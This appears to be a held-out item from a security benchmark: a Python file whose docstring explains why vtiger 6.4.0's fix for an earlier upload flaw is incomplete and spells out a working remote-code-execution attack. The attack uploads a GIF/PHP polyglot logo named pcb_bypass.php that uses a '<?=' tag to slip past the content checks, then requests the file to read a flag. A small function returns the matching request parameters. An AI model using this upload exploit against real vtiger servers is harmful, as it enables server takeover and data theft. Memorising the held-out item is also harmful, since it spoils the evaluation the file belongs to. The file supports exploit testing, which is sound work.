#!/usr/bin/env python3
"""[HELD-OUT] CVE-2016-1713 residual exploit — GIF/PHP polyglot logo upload -> RCE on V1.

CVE-2015-6000 was patched in vtiger 6.4.0 by ADDING a server-side content sniff to
Settings_Vtiger_CompanyDetailsSave_Action::process():

    //mime type check
    $mimeType = mime_content_type($logoDetails['tmp_name']);
    $mimeTypeContents = explode('/', $mimeType);
    if (!$logoDetails['size'] || $mimeTypeContents[0] != 'image'
        || !in_array($mimeTypeContents[1], Settings_Vtiger_CompanyDetails_Model::$logoSupportedFormats)) {
        $saveLogo = false;
    }

The fix is INCOMPLETE: it validates only the file CONTENT (magic bytes), never the
stored NAME/EXTENSION. saveLogo() still writes the upload verbatim to test/logo/<name>
keeping the attacker's .php extension, and the pre-existing "<?ph" content regex is still
sidestepped with the "<?=" short-echo tag. So a file that BEGINS with real GIF magic
("GIF89a...") sniffs as image/gif AND executes as PHP.

Residual on V1:
    1. POST the CompanyDetails form (admin) with logo = ("pcb_bypass.php",
       b"GIF89a...<?=@file_get_contents('/flag/pcb_flag.txt')?>", "image/gif"):
         - client MIME image/gif           -> pass
         - mime_content_type -> image/gif  -> pass (the added CVE-2015-6000 check)
         - content regex /<\\?php?/i        -> no "<?ph" (uses "<?=")  -> pass
       => saveLogo() writes test/logo/pcb_bypass.php verbatim.
    2. GET /test/logo/pcb_bypass.php -> Apache/PHP executes it (the GIF bytes are emitted
       as leading garbage, then "<?=...?>" echoes the canary). REACHES flag.

Contract:
  V1 (vtiger 6.4.0): GIF-magic polyglot passes the added mime sniff, lands as .php,
      executes -> flag exfiltrated via RCE. REACHES flag. (Seed's plain-text PHP is BLOCKED.)

Same sink / same flag channel as the seed (an executed uploaded .php echoing the
environment-planted canary) -> Variant A. NEVER exposed to the system-under-test.
"""
from __future__ import annotations


def candidate() -> dict:
    """Request candidate for the CVE-2016-1713 residual (GIF/PHP polyglot logo upload)."""
    return {
        "probe_id": "cve-2016-1713-companydetails-logo-gif-polyglot",
        "mode": "logo_upload",
        "filename": "pcb_bypass.php",   # kept verbatim by saveLogo(); .php => executes
        "content_kind": "gif_polyglot", # real GIF89a magic + PHP -> satisfies mime_content_type sniff
        "content_type": "image/gif",
    }


if __name__ == "__main__":
    print(candidate())
